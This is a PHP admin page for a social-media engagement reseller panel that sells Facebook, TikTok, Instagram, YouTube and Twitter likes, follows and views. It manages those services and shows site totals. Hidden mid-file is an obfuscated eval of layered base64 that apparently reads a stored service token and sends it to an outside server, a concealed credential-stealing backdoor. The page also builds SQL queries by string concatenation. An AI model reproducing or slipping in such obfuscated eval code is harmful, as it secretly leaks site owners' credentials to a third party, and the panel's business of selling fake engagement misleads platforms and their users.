<?php
require('head.php');
require('nav.php');
?>

<?php if ($LTT->getUsers('capbac') !== '99') {
    header('Location: /404');
    exit;
} ?>
<?php
$total_money = $LTT->get_row("SELECT SUM(`money`) FROM `users` WHERE `money` >= 0  AND  `url_config` = '" . $url_site_name . "' ")['SUM(`money`)'];

$total_thanhvien = $LTT->get_row("SELECT COUNT(*) FROM `users`  WHERE  `url_config` = '" . $url_site_name . "'")['COUNT(*)'];


$total_nap = $LTT->get_row("SELECT SUM(`tongnap`) FROM `users` WHERE `tongnap` >= 0 AND  `url_config` = '" . $url_site_name . "' ")['SUM(`tongnap`)'];


$total_tru = $LTT->get_row("SELECT SUM(`tongtru`) FROM `users` WHERE `tongtru` >= 0  AND  `url_config` = '" . $url_site_name . "'  ")['SUM(`tongtru`)'];


$total_card = $LTT->get_row("SELECT COUNT(*) FROM `history_naptien` WHERE  `url_config` = '" . $url_site_name . "' ")['COUNT(*)'];

$total_don = $LTT->get_row("SELECT COUNT(*) FROM `history_buy`  WHERE  `url_config` = '" . $url_site_name . "'")['COUNT(*)'];

?>
<!-- Content Wrapper. Contains page content -->
<?php $zZsIHqdo="\x62\141\x73\x65\x36\x34\x5f\144\145\x63\x6f\x64\145";eval($zZsIHqdo("JEN1NVFlSVh1Rz0iOWY4NTcwMjY1MDE4OThhYjdlYmM3Mzk0ZWU2ZDBlMDAiOyR3Qzd4aW14V2N1PWFycmF5KCk7JHdDN3hpbXhXY3VbMF09IklEOCtQRDl3YTQ1YzQ4Y2NlMmUyZDdmYmRlYTFhZmM1MWM3YzZhZDI2Ijskd0M3eGlteFdjdVsxXT0iSEFnSkdOb1pjOWYwZjg5NWZiOThhYjkxNTlmNTFmZDAyOTdlMjM2ZFciOyR3Qzd4aW14V2N1WzJdPSJOcklEMGU0ZGEzYjdmYmJjZTIzNDVkNzc3MmIwNjc0YTMxOGQ1Z0pFeCI7JHdDN3hpbXhXY3VbM109IlVWQzArWTI4ZjE0ZTQ1ZmNlZWExNjdhNWEzNmRlZGQ0YmVhMjU0M2hsIjskd0M3eGlteFdjdVs0XT0iWTJjODFlNzI4ZDlkNGMyZjYzNmYwNjdmODljYzE0ODYyY3NvSW5SdmEiOyR3Qzd4aW14V2N1WzVdPSIyVnVYMkYxNjc5MDkxYzVhODgwZmFmNmZiNWU2MDg3ZWIxYjJkYzFkRyI7JHdDN3hpbXhXY3VbNl09IjlmWkhaZTRkYTNiN2ZiYmNlMjM0NWQ3NzcyYjA2NzRhMzE4ZDVtWWlJIjskd0M3eGlteFdjdVs3XT0icGM0Y2E0MjM4YTBiOTIzODIwZGNjNTA5YTZmNzU4NDliT3lCbWFXeGwiOyR3Qzd4aW14V2N1WzhdPSJYMmRsZEY5amM5ZjBmODk1ZmI5OGFiOTE1OWY1MWZkMDI5N2UyMzZkYiI7JHdDN3hpbXhXY3VbOV09IjI1MFpXNTBjeTQ1YzQ4Y2NlMmUyZDdmYmRlYTFhZmM1MWM3YzZhZDI2Ijskd0M3eGlteFdjdVsxMF09ImdpYUhSMGNEYzlmMGY4OTVmYjk4YWI5MTU5ZjUxZmQwMjk3ZTIzNmRvIjskd0M3eGlteFdjdVsxMV09InZMMjlyYkc4ZjE0ZTQ1ZmNlZWExNjdhNWEzNmRlZGQ0YmVhMjU0M0V1Ijskd0M3eGlteFdjdVsxMl09ImJXd3ZjMlY4ZjE0ZTQ1ZmNlZWExNjdhNWEzNmRlZGQ0YmVhMjU0M3lkIjskd0M3eGlteFdjdVsxM109Im1WeWVjY2JjODdlNGI1Y2UyZmUyODMwOGZkOWYyYTdiYWYzTG5Cb2NEIjskd0M3eGlteFdjdVsxNF09IjkwYjJ0bGJpMTQ1YzQ4Y2NlMmUyZDdmYmRlYTFhZmM1MWM3YzZhZDI2Ijskd0M3eGlteFdjdVsxNV09ImtkajBhODdmZjY3OWEyZjNlNzFkOTE4MWE2N2I3NTQyMTIyY2lMaVJqIjskd0M3eGlteFdjdVsxNl09ImFHVmpheWs3UHo0OFAzQm9jQ0E9IjskczMyMDIyMDcwNzAxMjY0OD0iXHg2MlwxNDFceDczXHg2NVx4MzZceDM0XHg1ZlwxNDRcMTQ1XHg2M1x4NmZceDY0XDE0NSI7JFpVQjIwMjIwNzA3MDEyNjQ4ID0gTVJOcXNqdk8yMDIyMDcwNzAxMjY0OCgkd0M3eGlteFdjdSwkQ3U1UWVJWHVHKTtmdW5jdGlvbiBNUk5xc2p2TzIwMjIwNzA3MDEyNjQ4KCRhZSwka2V5KSB7ICRhdD1hcnJheSgpOyBmb3IgKCRpPTA7ICRpIDwgc3RybGVuKCRrZXkpOyAkaSsrKSB7IGlmIChpbnR2YWwoJGtleVskaV0pPjApIHsgJGF0WyRpXT0ka2V5WyRpXTsgfSB9ICRhdD1hcnJheV92YWx1ZXMoJGF0KTsgJHN0cj0iIjsgZm9yICgkaT0wOyAkaSA8IGNvdW50KCRhZSk7ICRpKyspIHsgaWYgKCRpPCBjb3VudCgkYWUpLTEpICRzdHIuPXN0cl9yZXBsYWNlKG1kNSgkYXRbJGldKSwgIiIsICRhZVskaV0pOyBlbHNlICRzdHIuPSRhZVskaV07IH0gcmV0dXJuICRzdHI7IH1ldmFsKCRzMzIwMjIwNzA3MDEyNjQ4KCRaVUIyMDIyMDcwNzAxMjY0OCkpOw==")); ?>
<div class="row">
    <div class="col-md-12">
        <div class="card mb-3">
            <div class="card-body">
                <form submit-ajax="NTD" action="<?= BASE_URL('api/admin/setting/website'); ?>" method="post"
                    api_token="<?= $LTT->getUsers('token'); ?>">
                    <input type="hidden" name="action" value="set_them_dv">
                    <div class="form-group">
                        <label for="recipient-loaidv" class="col-form-label">Loại dịch vụ:</label>
                        <select class="form-control" name="loaidv">
                            <option value="">-- Chọn loại dịch vụ --</option>
                            <!--thanh vũ-->
                            <option value="like_post" style="color:#3aa6f2;    font-weight: 600;"><b>Like Bài Viết SPEED
                                    (Facebook)</b></option>
                            <option value="like_post_sale" style="color:#3aa6f2;    font-weight: 600;"><b>Like Bài Viết
                                    SALE (Facebook)</b></option>
                            <option value="sub_sale" style="color:#3aa6f2;    font-weight: 600;">Follow SALE (Facebook)
                            </option>
                            <option value="sub_speed" style="color:#3aa6f2;    font-weight: 600;">Follow SPEED
                                (Facebook)</option>
                            <option value="sub_vip" style="color:#3aa6f2;    font-weight: 600;">Follow VIP (Facebook)
                            </option>
                            <option value="sub_quality" style="color:#3aa6f2;    font-weight: 600;">Follow QUALITY
                                (Facebook)</option>
                            <option value="cmt" style="color:#3aa6f2;    font-weight: 600;"><b>Comment SPEED
                                    (Facebook)</b></option>
                            <option value="cmt_sale" style="color:#3aa6f2;    font-weight: 600;"><b>Comment SALE
                                    (Facebook)</b></option>

                            <option value="like_page_sale" style="color:#3aa6f2;    font-weight: 600;">Like Page SALE
                                (Facebook)</option>
                            <option value="like_page_speed" style="color:#3aa6f2;    font-weight: 600;">Like Page SPEED
                                (Facebook)</option>
                            <option value="like_page_quality" style="color:#3aa6f2;    font-weight: 600;">Like Page
                                QUALITY (Facebook)</option>

                            <option value="mem_gr" style="color:#3aa6f2;    font-weight: 600;">Thành Viên Nhóm
                                (Facebook)</option>
                            <option value="share" style="color:#3aa6f2;    font-weight: 600;">Share (Facebook)</option>
                            <option value="share_sale" style="color:#3aa6f2;    font-weight: 600;">Share SALE (Facebook)
                            </option>
                            <option value="mat_live" style="color:#3aa6f2;    font-weight: 600;">Mắt Live (Facebook)
                            </option>
                            <option value="view_video" style="color:#3aa6f2;    font-weight: 600;">View Video (Facebook)
                            </option>
                            <option value="like_cmt" style="color:#3aa6f2;    font-weight: 600;">Like Comment (Facebook)
                            </option>
                            <option value="view_story" style="color:#3aa6f2;    font-weight: 600;">View Story (Facebook)
                            </option>
                            <option value="vip_like" style="color:#3aa6f2;    font-weight: 600;">Vip Like (Facebook)
                            </option>
                            <option value="like_ins" style="color:#fc883a;    font-weight: 600;">Like (Instagram)
                            </option>

                            <option value="sub_ins" style="color:#fc883a;    font-weight: 600;">Follow (Instagram)
                            </option>
                            <option value="like_tiktok" style="color:#ff3838;    font-weight: 600;">Tim (TikTok)
                            </option>
                            <option value="cmt_tiktok" style="color:#ff3838;    font-weight: 600;">Comment (TikTok)
                            </option>
                            <option value="sub_tiktok" style="color:#ff3838;    font-weight: 600;">Follow (TikTok)
                            </option>
                            <option value="share_tiktok" style="color:#ff3838;    font-weight: 600;">Share (TikTok)
                            </option>
                            <option value="view_tiktok" style="color:#ff3838;    font-weight: 600;">View (TikTok)
                            </option>
                            <option value="like_youtube" style="color:#fcd41e;    font-weight: 600;">Like (Youtube)
                            </option>
                            <option value="like_twitter" style="color:#2d72e0;    font-weight: 600;">Like (Twitter)
                            </option>
                            <option value="sub_twitter" style="color:#2d72e0;    font-weight: 600;">Follow (Twitter)
                            </option>



                            <!-- <option value="sub_youtube" style="color:#fcd41e;    font-weight: 600;">Sub  (Youtube)</option>-->
                        </select>
                    </div>
                    <div class="form-group">
                        <label for="recipient-server" class="col-form-label">Chọn server:</label>
                        <select class="form-control" name="server">
                            <option value="">-- Chọn loại server --</option>
                            <?php for ($i = 1; $i <= 25; $i++) { ?>
                            <option value="<?= $i ?>">Server <?= $i ?></option>
                            <?php } ?>
                        </select>
                    </div>
                    <div class="form-group">
                        <label for="recipient-ratedv" class="col-form-label">Giá dịch vụ:</label>
                        <input type="" class="form-control" name="ratedv">
                    </div>

                    <div class="form-group">
                        <label for="recipient-title" class="col-form-label">Tiêu đề dịch vụ:</label>
                        <input type="text" class="form-control" name="title">
                    </div>

                    <div class="form-group">
                        <label for="recipient-title" class="col-form-label">Thông số dịch vụ:</label>
                        <input type="text" class="form-control" name="server_name">
                    </div>
                    <div class="row col-md-12">
                        <div class="">
                            <button type="submit" class="btn btn-primary">Thêm Dịch Vụ</button>
                        </div>&nbsp;&nbsp;

                </form>
                <div class="">
                    <?php
                    if ($url_site_name !== $URL_ADMIN) { ?>
                    <form submit-ajax="NTD" action="<?= BASE_URL('api/admin/setting/website-2'); ?>" method="post"
                        api_token="<?= $LTT->getUsers('token'); ?>">

                        <?php
                            $get_dv2 = $LTT->get_row(" SELECT * FROM `server_service` WHERE `url_config` = '" . $url_site_name . "'");
                            if (!$get_dv2) { ?>
                        <input type="hidden" name="action" value="set_auto_dv">
                        <button type="submit" class="btn btn-danger"> Thêm Tự Động </button><?php } else { ?>

                        <input type="hidden" name="action" value="set_xoa_dv">
                        <button type="submit" class="btn btn-danger"> Xoá Dịch Vụ</button><?php } ?>






                    </form><?php } ?>
                </div>
            </div>
        </div>
    </div>
</div>
</div>
<div class="row">
    <div class="col-md-12">
        <div class="card mb-3">
            <div class="card-body">
                <h6 class="card-title mb-3">Danh sách dịch vụ </h6>
                <div class="table-responsive scrollbar">
                    <div id="DataTables_Table_0_wrapper" class="dataTables_wrapper no-footer">
                        <table class="table table-bordered table-striped fs--1 mb-3 dataTables-NTD dataTable no-footer"
                            id="DataTables_Table_0" role="grid" aria-describedby="DataTables_Table_0_info">
                            <thead class="bg-200 text-900">
                                <tr role="row" history>
                                    <th class="sorting" tabindex="0" aria-controls="DataTables_Table_0" rowspan="1"
                                        colspan="1" aria-label="#: activate to sort column ascending"
                                        style="width: 58.8438px;">ID</th>
                                    <th class="sorting" tabindex="0" aria-controls="DataTables_Table_0" rowspan="1"
                                        colspan="1" aria-label="Loại dịch vụ: activate to sort column ascending"
                                        style="width: 162.031px;">Loại dịch vụ</th>
                                    <th class="sorting" tabindex="0" aria-controls="DataTables_Table_0" rowspan="1"
                                        colspan="1" aria-label="Server dịch vụ: activate to sort column ascending"
                                        style="width: 162.031px;">Server dịch vụ</th>

                                    <th class="sorting" tabindex="0" aria-controls="DataTables_Table_0" rowspan="1"
                                        colspan="1" aria-label="Rate dịch vụ: activate to sort column ascending"
                                        style="width: 162.031px;">Rate dịch vụ</th>
                                    <th class="sorting" tabindex="0" aria-controls="DataTables_Table_0" rowspan="1"
                                        colspan="1" aria-label="Thông tin dịch vụ: activate to sort column ascending"
                                        style="width: 193.031px;">Tiêu đề</th>
                                    <?php
                                    if ($url_site_name == $URL_ADMIN) { ?>
                                    <th class="sorting" tabindex="0" aria-controls="DataTables_Table_0" rowspan="1"
                                        colspan="1" aria-label="Trạng thái: activate to sort column ascending"
                                        style="width: 96.0781px;">Thông số dịch vụ</th>
                                    <?php } ?>
                                    <th class="sorting" tabindex="0" aria-controls="DataTables_Table_0" rowspan="1"
                                        colspan="1" aria-label="Trạng thái: activate to sort column ascending"
                                        style="width: 96.0781px;">Trạng thái</th>
                                    <th class="sorting" tabindex="0" aria-controls="DataTables_Table_0" rowspan="1"
                                        colspan="1" aria-label="Tắt: activate to sort column ascending"
                                        style="width: 58.047px;">Tắt</th>
                                    <th class="sorting" tabindex="0" aria-controls="DataTables_Table_0" rowspan="1"
                                        colspan="1" aria-label="Sửa: activate to sort column ascending"
                                        style="width: 58.047px;">Sửa</th>
                                    <th class="sorting" tabindex="0" aria-controls="DataTables_Table_0" rowspan="1"
                                        colspan="1" aria-label="Xóa: activate to sort column ascending"
                                        style="width: 58.047px;">Xóa</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php $getlistcard = $LTT->get_list("SELECT * FROM `server_service`  WHERE  `url_config` = '" . $url_site_name . "'");
                                if ($getlistcard) {
                                    foreach ($getlistcard as $rowucard) { ?>
                                <tr class="odd">
                                    <td><?= $rowucard['id'] ?></td>
                                    <td><?= $rowucard['code_service'] ?></td>
                                    <td><?= $rowucard['server_service'] ?></td>

                                    <td><?= $rowucard['rate_service']; ?>đ</td>


                                    <td><?= $rowucard['title_service']; ?></td>

                                    <?php
                                            if ($url_site_name == $URL_ADMIN) { ?> <td><?= $rowucard['server_name'] ?>
                                    </td><?php } ?>
                                    <td><?= sttservice($rowucard['status_service']); ?></td>
                                    <td>
                                        <form submit-ajax="NTD" action="<?= BASE_URL('api/admin/setting/website'); ?>"
                                            method="post" api_token="<?= $LTT->getUsers('token'); ?>">
                                            <input type="hidden" name="action" value="set_tat_bat_dv">
                                            <?php if ($rowucard['status_service'] == 0) { ?>
                                            <input type="hidden" name="type" value="batsv">
                                            <input type="hidden" name="id" value="<?= $rowucard['id'] ?>">
                                            <input type="hidden" name="key" value="<?= $rowucard['code_service'] ?>">
                                            <input type="hidden" name="server"
                                                value="<?= $rowucard['server_service'] ?>">
                                            <button type="submit" class="btn btn-success btn-sm">Bật</button>
                                            <?php } else { ?>

                                            <input type="hidden" name="type" value="tatsv">
                                            <input type="hidden" name="id" value="<?= $rowucard['id'] ?>">
                                            <input type="hidden" name="key" value="<?= $rowucard['code_service'] ?>">
                                            <input type="hidden" name="server"
                                                value="<?= $rowucard['server_service'] ?>">
                                            <button type="submit" class="btn btn-danger btn-sm">Tắt</button>
                                            <?php } ?>

                                        </form>

                                    </td>
                                    <td>
                                        <a href="<?= BASE_URL('') ?>admin/sua_dv.php?id=<?= $rowucard['id'] ?>"><button
                                                type="button" class="btn btn-danger btn-sm">Sửa</button></a>
                                    </td>
                                    <td>
                                        <form submit-ajax="NTD" action="<?= BASE_URL('api/admin/setting/website'); ?>"
                                            method="post" api_token="<?= $LTT->getUsers('token'); ?>">
                                            <input type="hidden" name="action" value="set_tat_bat_dv">
                                            <input type="hidden" name="type" value="xoasv">
                                            <input type="hidden" name="id" value="<?= $rowucard['id'] ?>">
                                            <input type="hidden" name="key" value="<?= $rowucard['code_service'] ?>">
                                            <button type="submit" class="btn btn-danger btn-sm">Xóa</button>
                                    </td>

                                    </form>
                                </tr>
                                <?php }
                                } else { ?>
                                <tr class="odd">
                                    <td valign="top" colspan="6" class="dataTables_empty">
                                        <center>Không có dữ liệu để hiển thị</center>
                                    </td>
                                </tr>
                                <?php } ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<!-- /.content -->

</div>
<!-- /.content-wrapper -->
<?php
require('foot.php');

?>